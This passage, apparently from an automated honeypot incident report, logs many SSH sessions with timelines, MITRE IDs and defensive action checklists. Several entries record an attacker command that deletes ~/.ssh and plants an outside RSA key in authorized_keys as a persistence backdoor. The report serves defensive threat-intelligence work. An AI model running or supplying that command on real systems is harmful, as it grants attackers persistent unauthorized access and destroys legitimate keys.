| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:30:15` | `cowrie.session.connect` |
| `2026-06-02 15:30:15` | `cowrie.client.version` |
| `2026-06-02 15:30:15` | `cowrie.client.kex` |
| `2026-06-02 15:30:16` | `cowrie.login.success` |
| `2026-06-02 15:30:16` | `cowrie.session.params` |
| `2026-06-02 15:30:16` | `cowrie.command.input` |
| `2026-06-02 15:30:16` | `cowrie.command.failed` |
| `2026-06-02 15:30:17` | `cowrie.log.closed` |
| `2026-06-02 15:30:17` | `cowrie.session.params` |
| `2026-06-02 15:30:17` | `cowrie.command.input` |
| `2026-06-02 15:30:17` | `cowrie.session.file_download` |
| `2026-06-02 15:30:17` | `cowrie.log.closed` |
| `2026-06-02 15:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63d67ca0b0a3

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-06-02 15:30 |
| **Last Seen** | 2026-06-02 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:30:20` | `cowrie.session.connect` |
| `2026-06-02 15:30:20` | `cowrie.client.version` |
| `2026-06-02 15:30:20` | `cowrie.client.kex` |
| `2026-06-02 15:30:21` | `cowrie.login.success` |
| `2026-06-02 15:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a580ebb571

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:42 |
| **Last Seen** | 2026-06-02 15:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:42:01` | `cowrie.session.connect` |
| `2026-06-02 15:42:01` | `cowrie.client.version` |
| `2026-06-02 15:42:02` | `cowrie.client.kex` |
| `2026-06-02 15:42:03` | `cowrie.login.success` |
| `2026-06-02 15:42:03` | `cowrie.session.params` |
| `2026-06-02 15:42:03` | `cowrie.command.input` |
| `2026-06-02 15:42:03` | `cowrie.command.failed` |
| `2026-06-02 15:42:04` | `cowrie.log.closed` |
| `2026-06-02 15:42:04` | `cowrie.session.params` |
| `2026-06-02 15:42:04` | `cowrie.command.input` |
| `2026-06-02 15:42:04` | `cowrie.session.file_download` |
| `2026-06-02 15:42:04` | `cowrie.log.closed` |
| `2026-06-02 15:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f959f9601726

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:42 |
| **Last Seen** | 2026-06-02 15:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:42:11` | `cowrie.session.connect` |
| `2026-06-02 15:42:11` | `cowrie.client.version` |
| `2026-06-02 15:42:11` | `cowrie.client.kex` |
| `2026-06-02 15:42:12` | `cowrie.login.success` |
| `2026-06-02 15:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f68d31122b2c

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:43 |
| **Last Seen** | 2026-06-02 15:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:43:26` | `cowrie.session.connect` |
| `2026-06-02 15:43:26` | `cowrie.client.version` |
| `2026-06-02 15:43:26` | `cowrie.client.kex` |
| `2026-06-02 15:43:27` | `cowrie.login.success` |
| `2026-06-02 15:43:28` | `cowrie.session.params` |
| `2026-06-02 15:43:28` | `cowrie.command.input` |
| `2026-06-02 15:43:28` | `cowrie.command.failed` |
| `2026-06-02 15:43:29` | `cowrie.log.closed` |
| `2026-06-02 15:43:29` | `cowrie.session.params` |
| `2026-06-02 15:43:29` | `cowrie.command.input` |
| `2026-06-02 15:43:29` | `cowrie.session.file_download` |
| `2026-06-02 15:43:29` | `cowrie.log.closed` |
| `2026-06-02 15:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0406fd7b7d6a

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:43 |
| **Last Seen** | 2026-06-02 15:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:43:35` | `cowrie.session.connect` |
| `2026-06-02 15:43:35` | `cowrie.client.version` |
| `2026-06-02 15:43:35` | `cowrie.client.kex` |
| `2026-06-02 15:43:36` | `cowrie.login.success` |
| `2026-06-02 15:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c695c2bdd65

| Field | Detail |
|---|---|
| **Source IP** | `182.43.235[.]75` |
| **First Seen** | 2026-06-02 15:47 |
| **Last Seen** | 2026-06-02 15:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:47:24` | `cowrie.session.connect` |
| `2026-06-02 15:47:24` | `cowrie.client.version` |
| `2026-06-02 15:47:24` | `cowrie.client.kex` |
| `2026-06-02 15:47:24` | `cowrie.login.success` |
| `2026-06-02 15:47:25` | `cowrie.session.params` |
| `2026-06-02 15:47:25` | `cowrie.command.input` |
| `2026-06-02 15:47:25` | `cowrie.command.failed` |
| `2026-06-02 15:47:25` | `cowrie.log.closed` |
| `2026-06-02 15:47:25` | `cowrie.session.params` |
| `2026-06-02 15:47:25` | `cowrie.command.input` |
| `2026-06-02 15:47:25` | `cowrie.session.file_download` |
| `2026-06-02 15:47:25` | `cowrie.log.closed` |
| `2026-06-02 15:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `182.43.235[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df0b1d7b158a

| Field | Detail |
|---|---|
| **Source IP** | `182.43.235[.]75` |
| **First Seen** | 2026-06-02 15:47 |
| **Last Seen** | 2026-06-02 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:47:27` | `cowrie.session.connect` |
| `2026-06-02 15:47:27` | `cowrie.client.version` |
| `2026-06-02 15:47:27` | `cowrie.client.kex` |
| `2026-06-02 15:47:28` | `cowrie.login.success` |
| `2026-06-02 15:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `182.43.235[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b71ee69bdad

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:48 |
| **Last Seen** | 2026-06-02 15:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:48:14` | `cowrie.session.connect` |
| `2026-06-02 15:48:14` | `cowrie.client.version` |
| `2026-06-02 15:48:14` | `cowrie.client.kex` |
| `2026-06-02 15:48:16` | `cowrie.login.success` |
| `2026-06-02 15:48:16` | `cowrie.session.params` |
| `2026-06-02 15:48:16` | `cowrie.command.input` |
| `2026-06-02 15:48:16` | `cowrie.command.failed` |
| `2026-06-02 15:48:17` | `cowrie.log.closed` |
| `2026-06-02 15:48:17` | `cowrie.session.params` |
| `2026-06-02 15:48:17` | `cowrie.command.input` |
| `2026-06-02 15:48:17` | `cowrie.session.file_download` |
| `2026-06-02 15:48:17` | `cowrie.log.closed` |
| `2026-06-02 15:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51519f595472

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:48 |
| **Last Seen** | 2026-06-02 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:48:26` | `cowrie.session.connect` |
| `2026-06-02 15:48:26` | `cowrie.client.version` |
| `2026-06-02 15:48:26` | `cowrie.client.kex` |
| `2026-06-02 15:48:27` | `cowrie.login.success` |
| `2026-06-02 15:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4e498d11ebf

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-02 15:48 |
| **Last Seen** | 2026-06-02 15:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:48:53` | `cowrie.session.connect` |
| `2026-06-02 15:48:53` | `cowrie.client.version` |
| `2026-06-02 15:48:53` | `cowrie.client.kex` |
| `2026-06-02 15:48:53` | `cowrie.login.success` |
| `2026-06-02 15:48:54` | `cowrie.session.params` |
| `2026-06-02 15:48:54` | `cowrie.command.input` |
| `2026-06-02 15:48:54` | `cowrie.command.failed` |
| `2026-06-02 15:48:54` | `cowrie.log.closed` |
| `2026-06-02 15:48:54` | `cowrie.session.params` |
| `2026-06-02 15:48:54` | `cowrie.command.input` |
| `2026-06-02 15:48:54` | `cowrie.session.file_download` |
| `2026-06-02 15:48:54` | `cowrie.log.closed` |
| `2026-06-02 15:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dccef090993

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-02 15:48 |
| **Last Seen** | 2026-06-02 15:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:48:56` | `cowrie.session.connect` |
| `2026-06-02 15:48:56` | `cowrie.client.version` |
| `2026-06-02 15:48:56` | `cowrie.client.kex` |
| `2026-06-02 15:48:57` | `cowrie.login.success` |
| `2026-06-02 15:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5928d96cbc

| Field | Detail |
|---|---|
| **Source IP** | `121.26.28[.]26` |
| **First Seen** | 2026-06-02 15:51 |
| **Last Seen** | 2026-06-02 15:56 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:51:12` | `cowrie.session.connect` |
| `2026-06-02 15:51:13` | `cowrie.client.version` |
| `2026-06-02 15:51:13` | `cowrie.client.kex` |
| `2026-06-02 15:51:15` | `cowrie.login.success` |
| `2026-06-02 15:56:15` | `cowrie.session.file_upload` |
| `2026-06-02 15:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.26.28[.]26` to AbuseIPDB if not already reported
- [ ] Block `121.26.28[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f6e6baf29f4

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:07` | `cowrie.session.connect` |
| `2026-06-02 15:53:07` | `cowrie.client.version` |
| `2026-06-02 15:53:07` | `cowrie.client.kex` |
| `2026-06-02 15:53:08` | `cowrie.login.success` |
| `2026-06-02 15:53:09` | `cowrie.session.params` |
| `2026-06-02 15:53:09` | `cowrie.command.input` |
| `2026-06-02 15:53:09` | `cowrie.command.failed` |
| `2026-06-02 15:53:09` | `cowrie.log.closed` |
| `2026-06-02 15:53:09` | `cowrie.session.params` |
| `2026-06-02 15:53:09` | `cowrie.command.input` |
| `2026-06-02 15:53:10` | `cowrie.session.file_download` |
| `2026-06-02 15:53:10` | `cowrie.log.closed` |
| `2026-06-02 15:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848c8ae0e555

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:16` | `cowrie.session.connect` |
| `2026-06-02 15:53:16` | `cowrie.client.version` |
| `2026-06-02 15:53:16` | `cowrie.client.kex` |
| `2026-06-02 15:53:17` | `cowrie.login.success` |
| `2026-06-02 15:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8ff44681a07

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:21` | `cowrie.session.connect` |
| `2026-06-02 15:53:21` | `cowrie.client.version` |
| `2026-06-02 15:53:21` | `cowrie.client.kex` |
| `2026-06-02 15:53:22` | `cowrie.login.success` |
| `2026-06-02 15:53:22` | `cowrie.session.params` |
| `2026-06-02 15:53:22` | `cowrie.command.input` |
| `2026-06-02 15:53:22` | `cowrie.command.failed` |
| `2026-06-02 15:53:22` | `cowrie.log.closed` |
| `2026-06-02 15:53:23` | `cowrie.session.params` |
| `2026-06-02 15:53:23` | `cowrie.command.input` |
| `2026-06-02 15:53:23` | `cowrie.session.file_download` |
| `2026-06-02 15:53:23` | `cowrie.log.closed` |
| `2026-06-02 15:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bdd590acb19

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:25` | `cowrie.session.connect` |
| `2026-06-02 15:53:25` | `cowrie.client.version` |
| `2026-06-02 15:53:25` | `cowrie.client.kex` |
| `2026-06-02 15:53:25` | `cowrie.login.success` |
| `2026-06-02 15:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cb23d3b7a67

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
